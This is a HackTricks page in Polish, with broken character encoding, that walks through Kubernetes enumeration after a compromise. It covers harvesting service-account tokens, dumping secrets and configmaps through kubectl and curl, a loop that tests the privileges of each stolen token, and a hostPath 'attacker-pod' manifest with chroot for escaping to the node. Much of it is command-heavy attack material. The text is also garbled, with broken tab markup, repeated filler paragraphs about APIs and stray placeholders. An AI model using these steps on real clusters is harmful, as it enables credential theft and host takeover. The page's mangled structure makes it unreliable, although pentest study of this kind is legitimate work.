# Wyliczanie Kubernetes

{% hint style="success" %}
Dowiedz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na GitHubie.

</details>
{% endhint %}

## Tokeny Kubernetes

JeÅ›li uzyskasz skompromitowany dostÄ™p do maszyny, uÅ¼ytkownik moÅ¼e mieÄ‡ dostÄ™p do platformy Kubernetes. Token zazwyczaj znajduje siÄ™ w pliku wskazywanym przez **zmiennÄ… Å›rodowiskowÄ… `KUBECONFIG`** lub **wewnÄ…trz `~/.kube`**.

W tym folderze moÅ¼esz znaleÅºÄ‡ pliki konfiguracyjne z **tokenami i konfiguracjami do poÅ‚Ä…czenia z serwerem API**. W tym folderze znajduje siÄ™ rÃ³wnieÅ¼ folder pamiÄ™ci podrÄ™cznej z wczeÅ›niej pobranymi informacjami.

JeÅ›li skompromitowaÅ‚eÅ› pod w Å›rodowisku Kubernetes, istniejÄ… inne miejsca, gdzie moÅ¼esz znaleÅºÄ‡ tokeny i informacje o bieÅ¼Ä…cym Å›rodowisku K8:

### Tokeny Konta UsÅ‚ugi

Zanim przejdziesz dalej, jeÅ›li nie wiesz, co to jest usÅ‚uga w Kubernetes, sugerujÄ™ **przejÅ›cie pod ten link i przeczytanie przynajmniej informacji o architekturze Kubernetes**.

ZaczerpniÄ™te z [dokumentacji](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) Kubernetes:

_â€Gdy tworzysz pod, jeÅ›li nie okreÅ›lisz konta usÅ‚ugi, automatycznie przypisane jest mu_ domyÅ›lne _konto usÅ‚ugi w tej samej przestrzeni nazw.â€_

**Konto usÅ‚ugi** to obiekt zarzÄ…dzany przez Kubernetes i uÅ¼ywany do nadawania toÅ¼samoÅ›ci procesom uruchamianym w podzie.\
KaÅ¼de konto usÅ‚ugi ma powiÄ…zany z nim sekret, a ten sekret zawiera token nosiciela. Jest to token JSON Web Token (JWT), metoda reprezentowania roszczeÅ„ bezpiecznie miÄ™dzy dwiema stronami.

Zazwyczaj **jeden** z katalogÃ³w:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

zawiera pliki:

* **ca.crt**: To certyfikat ca do sprawdzania komunikacji kubernetes
* **namespace**: Wskazuje bieÅ¼Ä…cÄ… przestrzeÅ„ nazw
* **token**: Zawiera **token usÅ‚ugi** bieÅ¼Ä…cego poda.

Teraz, gdy masz token, moÅ¼esz znaleÅºÄ‡ serwer API w zmiennej Å›rodowiskowej **`KUBECONFIG`**. Aby uzyskaÄ‡ wiÄ™cej informacji, uruchom `(env | set) | grep -i "kuber|kube`**`"`**

Token konta usÅ‚ugi jest podpisywany przez klucz znajdujÄ…cy siÄ™ w pliku **sa.key** i weryfikowany przez **sa.pub**.

DomyÅ›lna lokalizacja w **Kubernetes**:

* /etc/kubernetes/pki

DomyÅ›lna lokalizacja w **Minikube**:

* /var/lib/localkube/certs

### GorÄ…ce Pody

_**GorÄ…ce pody**_ to pody zawierajÄ…ce uprzywilejowany token konta usÅ‚ugi. Uprzywilejowany token konta usÅ‚ugi to token, ktÃ³ry ma uprawnienia do wykonywania uprzywilejowanych zadaÅ„, takich jak wyÅ›wietlanie tajemnic, tworzenie podÃ³w, itp.

## RBAC

JeÅ›li nie wiesz, co to jest **RBAC**, **przeczytaj tÄ™ sekcjÄ™**.

## Szybki Arkusz Wyliczeniowy

Aby wyliczyÄ‡ Å›rodowisko K8s, potrzebujesz kilku rzeczy:

* **Poprawny token autoryzacyjny**. W poprzedniej sekcji zobaczyliÅ›my, gdzie szukaÄ‡ tokenu uÅ¼ytkownika i tokenu konta usÅ‚ugi.
* **Adres (**_**https://host:port**_**) serwera API Kubernetes**. Zazwyczaj moÅ¼na go znaleÅºÄ‡ w zmiennych Å›rodowiskowych i/lub w pliku konfiguracyjnym kube.
* **Opcjonalnie**: **ca.crt do weryfikacji serwera API**. MoÅ¼na go znaleÅºÄ‡ w tych samych miejscach, gdzie moÅ¼na znaleÅºÄ‡ token. Jest to przydatne do weryfikacji certyfikatu serwera API, ale korzystajÄ…c z `--insecure-skip-tls-verify` z `kubectl` lub `-k` z `curl`, nie bÄ™dziesz potrzebowaÄ‡ tego.

DziÄ™ki tym szczegÃ³Å‚om moÅ¼esz **wyliczyÄ‡ kubernetes**. JeÅ›li **API** z jakiegoÅ› powodu jest **dostÄ™pne** przez **Internet**, moÅ¼esz po prostu pobraÄ‡ te informacje i wyliczyÄ‡ platformÄ™ z twojego hosta.

Jednak zazwyczaj **serwer API znajduje siÄ™ w sieci wewnÄ™trznej**, dlatego bÄ™dziesz musiaÅ‚ **utworzyÄ‡ tunel** przez skompromitowanÄ… maszynÄ™, aby uzyskaÄ‡ do niego dostÄ™p z twojej maszyny, lub moÅ¼esz **przesÅ‚aÄ‡** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binarny, lub uÅ¼yÄ‡ **`curl/wget/cokolwiek`** do wykonywania surowych Å¼Ä…daÅ„ HTTP do serwera API.

### RÃ³Å¼nice miÄ™dzy czasownikami `list` a `get`

Z uprawnieniami **`get`** moÅ¼esz uzyskaÄ‡ dostÄ™p do informacji o okreÅ›lonych zasobach (_opcja `describe` w `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
JeÅ›li masz uprawnienie **`list`**, moÅ¼esz wykonywaÄ‡ Å¼Ä…dania API w celu wylistowania danego typu zasobu (_opcja `_`get`_ w `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
JeÅ›li masz uprawnienie **`watch`**, moÅ¼esz wykonywaÄ‡ Å¼Ä…dania API w celu monitorowania zasobÃ³w:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
OtwierajÄ… poÅ‚Ä…czenie strumieniowe, ktÃ³re zwraca peÅ‚ny manifest Deployment za kaÅ¼dym razem, gdy siÄ™ zmienia (lub gdy zostanie utworzony nowy).

{% hint style="danger" %}
NastÄ™pujÄ…ce polecenia `kubectl` wskazujÄ… tylko, jak wyÅ›wietliÄ‡ obiekty. JeÅ›li chcesz uzyskaÄ‡ dostÄ™p do danych, musisz uÅ¼yÄ‡ `describe` zamiast `get`.
{% endhint %}

### UÅ¼ycie curl

Z wnÄ™trza poda moÅ¼na uÅ¼yÄ‡ kilku zmiennych Å›rodowiskowych:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
DomyÅ›lnie pod moÅ¼e uzyskaÄ‡ dostÄ™p do serwera **kube-api** pod nazwÄ… domenowÄ… **`kubernetes.default.svc`**, a sieÄ‡ kube moÅ¼na zobaczyÄ‡ w **`/etc/resolv.config`**, gdzie znajdziesz adres serwera DNS Kubernetesa (".1" z tego samego zakresu to punkt koÅ„cowy kube-api).
{% endhint %}

### UÅ¼ywajÄ…c kubectl

MajÄ…c token i adres serwera API, uÅ¼ywasz kubectl lub curl do uzyskania do niego dostÄ™pu, zgodnie z poniÅ¼szym:

DomyÅ›lnie, APISERVER komunikuje siÄ™ za pomocÄ… schematu `https://`
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> jeÅ›li brak `https://` w adresie URL, moÅ¼esz otrzymaÄ‡ bÅ‚Ä…d typu Bad Request.

MoÅ¼esz znaleÅºÄ‡ [**oficjalny arkusz kalkulacyjny kubectl tutaj**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). Celem poniÅ¼szych sekcji jest przedstawienie w uporzÄ…dkowany sposÃ³b rÃ³Å¼nych opcji do wyliczenia i zrozumienia nowego K8s, do ktÃ³rego uzyskaÅ‚eÅ› dostÄ™p.

Aby znaleÅºÄ‡ Å¼Ä…danie HTTP, ktÃ³re wysyÅ‚a `kubectl`, moÅ¼esz uÅ¼yÄ‡ parametru `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Aktualna Konfiguracja

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

JeÅ›li udaÅ‚o ci siÄ™ ukraÅ›Ä‡ dane uwierzytelniajÄ…ce uÅ¼ytkownikÃ³w, moÅ¼esz je **skonfigurowaÄ‡ lokalnie** uÅ¼ywajÄ…c czegoÅ› w rodzaju:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Uzyskaj obsÅ‚ugiwane zasoby

DziÄ™ki tym informacjom bÄ™dziesz znaÄ‡ wszystkie usÅ‚ugi, ktÃ³re moÅ¼esz wymieniÄ‡

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Uzyskaj bieÅ¼Ä…ce uprawnienia

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}### API

W celu wylistowania wszystkich dostÄ™pnych API w klastrze Kubernetes, moÅ¼na uÅ¼yÄ‡ polecenia `kubectl get --raw /`. MoÅ¼na rÃ³wnieÅ¼ uÅ¼yÄ‡ narzÄ™dzia `kube-api` do automatycznego wylistowania wszystkich endpointÃ³w API. DziÄ™ki temu moÅ¼na uzyskaÄ‡ peÅ‚niejszy obraz dostÄ™pnych API w klastrze.
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Inny sposÃ³b sprawdzenia swoich uprawnieÅ„ to uÅ¼ycie narzÄ™dzia: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

MoÅ¼esz dowiedzieÄ‡ siÄ™ wiÄ™cej o **Kubernetes RBAC** w:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Gdy juÅ¼ wiesz, jakie uprawnienia** posiadasz, sprawdÅº nastÄ™pujÄ…cÄ… stronÄ™, aby dowiedzieÄ‡ siÄ™, **czy moÅ¼esz je naduÅ¼yÄ‡** w celu eskalacji uprawnieÅ„:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Pozyskaj role innych osÃ³b

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Pobierz przestrzenie nazw

Kubernetes obsÅ‚uguje **wiele wirtualnych klastrÃ³w** wspieranych przez ten sam fizyczny klaster. Te wirtualne klastry nazywane sÄ… **przestrzeniami nazw**.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

### Wyliczanie zasobÃ³w API

Podczas testowania penetracyjnego klastra Kubernetes waÅ¼ne jest rÃ³wnieÅ¼ wyliczenie dostÄ™pnych zasobÃ³w API. MoÅ¼na to zrobiÄ‡, wysyÅ‚ajÄ…c zapytanie HTTP GET na adres URL klastra Kubernetes, na przykÅ‚ad:

```plaintext
GET /api
GET /apis
GET /apis/{api-group}
```

MoÅ¼na rÃ³wnieÅ¼ uÅ¼yÄ‡ narzÄ™dzi takich jak `kubectl` do wylistowania zasobÃ³w API:

```plaintext
kubectl get --raw /
kubectl get --raw /api
kubectl get --raw /apis
kubectl get --raw /apis/{api-group}
```

To pozwala na zidentyfikowanie dostÄ™pnych zasobÃ³w API, co moÅ¼e byÄ‡ przydatne podczas dalszego etapu testowania penetracyjnego. 

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Pobierz tajemnice

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}{{API}}{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

JeÅ›li moÅ¼esz odczytaÄ‡ tajemnice, moÅ¼esz uÅ¼yÄ‡ poniÅ¼szych linii, aby uzyskaÄ‡ uprawnienia zwiÄ…zane z kaÅ¼dym tokenem:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Pobierz konta usÅ‚ug

Jak omÃ³wiono na poczÄ…tku tej strony, **gdy uruchamiany jest pod, zazwyczaj przypisywane jest do niego konto usÅ‚ugi**. Dlatego teÅ¼, wylistowanie kont usÅ‚ug, ich uprawnieÅ„ i miejsca uruchomienia moÅ¼e umoÅ¼liwiÄ‡ uÅ¼ytkownikowi eskalacjÄ™ uprawnieÅ„.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}### API

API (Interfejs Programowania Aplikacji) jest zestawem reguÅ‚ i definicji, ktÃ³re umoÅ¼liwiajÄ… jednym systemom komunikacjÄ™ z innymi. W kontekÅ›cie Kubernetes, API moÅ¼e byÄ‡ uÅ¼ywane do zarzÄ…dzania zasobami klastra, takimi jak pody, usÅ‚ugi, replikacje itp. Podczas testowania penetracyjnego, waÅ¼ne jest zidentyfikowanie i zrozumienie dostÄ™pnych punktÃ³w koÅ„cowych API w celu ewentualnego wykorzystania luk w zabezpieczeniach.
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### Pobierz wdroÅ¼enia

WdroÅ¼enia okreÅ›lajÄ… **komponenty**, ktÃ³re muszÄ… byÄ‡ **uruchomione**.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}### API

API (Interfejs Programowania Aplikacji) jest zestawem reguÅ‚ i definicji, ktÃ³re umoÅ¼liwiajÄ… jednym systemom komunikacjÄ™ z innymi. W kontekÅ›cie Kubernetes, API moÅ¼e byÄ‡ uÅ¼ywane do zarzÄ…dzania zasobami klastra, takimi jak pody, usÅ‚ugi, replikacje itp. Podczas testowania penetracyjnego, waÅ¼ne jest zidentyfikowanie i zrozumienie dostÄ™pnych punktÃ³w koÅ„cowych API w celu ewentualnego wykorzystania luk w zabezpieczeniach.
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Pobierz Pojemniki

Pojemniki to rzeczywiste **kontenery**, ktÃ³re zostanÄ… **uruchomione**.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}### API

API (Interfejs Programowania Aplikacji) to zestaw reguÅ‚ i protokoÅ‚Ã³w, ktÃ³re umoÅ¼liwiajÄ… aplikacjom komunikacjÄ™ miÄ™dzy sobÄ…. W kontekÅ›cie Kubernetes, API moÅ¼e byÄ‡ uÅ¼ywane do zarzÄ…dzania zasobami klastra, takimi jak pody, usÅ‚ugi, replikacje itp. Podczas testowania penetracyjnego, waÅ¼ne jest zidentyfikowanie i zrozumienie dostÄ™pnych punktÃ³w koÅ„cowych API w celu ewentualnego wykorzystania luk w zabezpieczeniach.
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Pobierz usÅ‚ugi

UsÅ‚ugi Kubernetes sÅ‚uÅ¼Ä… do **udostÄ™pniania usÅ‚ugi na okreÅ›lonym porcie i adresie IP** (ktÃ³re bÄ™dÄ… dziaÅ‚aÄ‡ jako rÃ³wnowaÅ¼nik obciÄ…Å¼enia dla moduÅ‚Ã³w, ktÃ³re faktycznie oferujÄ… usÅ‚ugÄ™). Jest to interesujÄ…ce, aby wiedzieÄ‡, gdzie moÅ¼na znaleÅºÄ‡ inne usÅ‚ugi do prÃ³by ataku.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}Wyszukiwanie enumeracyjne API Kubernetes moÅ¼e ujawniÄ‡ informacje o zasobach klastra, takie jak usÅ‚ugi, koÅ„cÃ³wki, przestrzenie nazw, role, rolebindingi itp. MoÅ¼na to zrobiÄ‡, wysyÅ‚ajÄ…c zapytania do interfejsu API Kubernetes, aby uzyskaÄ‡ informacje o dostÄ™pnych zasobach i konfiguracjach. Jest to przydatne podczas oceny bezpieczeÅ„stwa klastra Kubernetes i identyfikacji ewentualnych luk w zabezpieczeniach. {% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### Pobierz wÄ™zÅ‚y

Pobierz wszystkie **wÄ™zÅ‚y skonfigurowane w klastrze**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}### API

API (Interfejs Programowania Aplikacji) to zestaw reguÅ‚ i protokoÅ‚Ã³w, ktÃ³re umoÅ¼liwiajÄ… aplikacjom komunikacjÄ™ miÄ™dzy sobÄ…. W kontekÅ›cie Kubernetes, API moÅ¼e byÄ‡ uÅ¼ywane do zarzÄ…dzania zasobami klastra, takimi jak pody, usÅ‚ugi, replikacje itp. Podczas testowania penetracyjnego, waÅ¼ne jest zidentyfikowanie i zrozumienie dostÄ™pnych punktÃ³w koÅ„cowych API w celu ewentualnego wykorzystania luk w zabezpieczeniach.
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
### Pobierz DaemonSets

**DaemonSets** pozwalajÄ… upewniÄ‡ siÄ™, Å¼e **okreÅ›lony pod dziaÅ‚a na wszystkich wÄ™zÅ‚ach** klastra (lub na wybranych). JeÅ›li usuniesz DaemonSet, zarzÄ…dzane przez niego pody rÃ³wnieÅ¼ zostanÄ… usuniÄ™te.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}### API

W celu wylistowania wszystkich dostÄ™pnych API w klastrze Kubernetes, moÅ¼na uÅ¼yÄ‡ polecenia `kubectl get --raw /`. MoÅ¼na rÃ³wnieÅ¼ uÅ¼yÄ‡ narzÄ™dzia `kube-api` do automatycznego wylistowania wszystkich endpointÃ³w API. DziÄ™ki temu moÅ¼na uzyskaÄ‡ peÅ‚niejszy obraz dostÄ™pnych funkcji i zasobÃ³w w klastrze.
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Pobierz zadanie cron

Zadania cron pozwalajÄ… zaplanowaÄ‡ uruchomienie poda, ktÃ³ry wykona jakieÅ› dziaÅ‚anie.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}Wyszukiwanie enumeracyjne API Kubernetes moÅ¼e ujawniÄ‡ informacje o zasobach klastra, takie jak usÅ‚ugi, skÅ‚adowiska, przestrzenie nazw i wiele innych. MoÅ¼na to zrobiÄ‡, wysyÅ‚ajÄ…c zapytania do interfejsu API Kubernetes, aby uzyskaÄ‡ listÄ™ dostÄ™pnych zasobÃ³w i ich konfiguracji. Jest to waÅ¼ny krok podczas testowania penetracyjnego klastra Kubernetes, aby zidentyfikowaÄ‡ potencjalne luki w zabezpieczeniach. {% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Pobierz configMap

configMap zawsze zawiera wiele informacji i plikÃ³w konfiguracyjnych, ktÃ³re sÄ… dostarczane do aplikacji uruchamianych w klastrze Kubernetes. Zazwyczaj moÅ¼na znaleÅºÄ‡ wiele haseÅ‚, sekretÃ³w, tokenÃ³w, ktÃ³re sÄ… uÅ¼ywane do Å‚Ä…czenia siÄ™ i uwierzytelniania w innych usÅ‚ugach wewnÄ™trznych/zewnÄ™trznych.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}{{Wyliczenie}}

Wyliczenie zasobÃ³w API w klastrze Kubernetes moÅ¼e byÄ‡ przeprowadzone za pomocÄ… narzÄ™dzi do skanowania sieci, takich jak Nmap lub przy uÅ¼yciu narzÄ™dzi do testowania penetracyjnego, takich jak kube-hunter. MoÅ¼na rÃ³wnieÅ¼ rÄ™cznie przeglÄ…daÄ‡ dostÄ™pne zasoby, takie jak serwisy, koÅ„cÃ³wki API i kontrolery, aby zidentyfikowaÄ‡ potencjalne punkty wejÅ›cia dla atakÃ³w. Upewnij siÄ™, Å¼e wszystkie zasoby API sÄ… odpowiednio zabezpieczone i majÄ… ograniczone uprawnienia dostÄ™pu.
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Pobierz "wszystko"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Pobierz zuÅ¼ycie zasobÃ³w przez pody**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Ucieczka z pojemnika

JeÅ›li jesteÅ› w stanie tworzyÄ‡ nowe pojemniki, moÅ¼esz prÃ³bowaÄ‡ uciec z nich do wÄ™zÅ‚a. Aby to zrobiÄ‡, musisz utworzyÄ‡ nowy pojemnik za pomocÄ… pliku yaml, przeÅ‚Ä…czyÄ‡ siÄ™ na utworzony pojemnik, a nastÄ™pnie uÅ¼yÄ‡ chroot do wejÅ›cia do systemu wÄ™zÅ‚a. MoÅ¼esz uÅ¼yÄ‡ juÅ¼ istniejÄ…cych pojemnikÃ³w jako odniesienia do pliku yaml, poniewaÅ¼ wyÅ›wietlajÄ… istniejÄ…ce obrazy i Å›cieÅ¼ki.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> JeÅ›li musisz utworzyÄ‡ pod na okreÅ›lonym wÄ™Åºle, moÅ¼esz uÅ¼yÄ‡ poniÅ¼szej komendy, aby uzyskaÄ‡ etykiety na wÄ™Åºle
>
> `k get nodes --show-labels`
>
> Zazwyczaj kubernetes.io/hostname i node-role.kubernetes.io/master to dobre etykiety do wyboru.
>
> [reference]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[oryginalne ÅºrÃ³dÅ‚o yaml](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Po tym utwÃ³rz pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Teraz moÅ¼esz przeÅ‚Ä…czyÄ‡ siÄ™ do utworzonej kapsuÅ‚y w nastÄ™pujÄ…cy sposÃ³b
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
I na koniec chrootujesz siÄ™ do systemu wÄ™zÅ‚a
```bash
chroot /root /bin/bash
```
Informacje uzyskane z: [Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Atakowanie i ObronnoÅ›Ä‡ Kubernetes: Bust-A-Kube â€“ Odcinek 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Referencje

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Naucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **UdostÄ™pniaj sztuczki hackingu, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
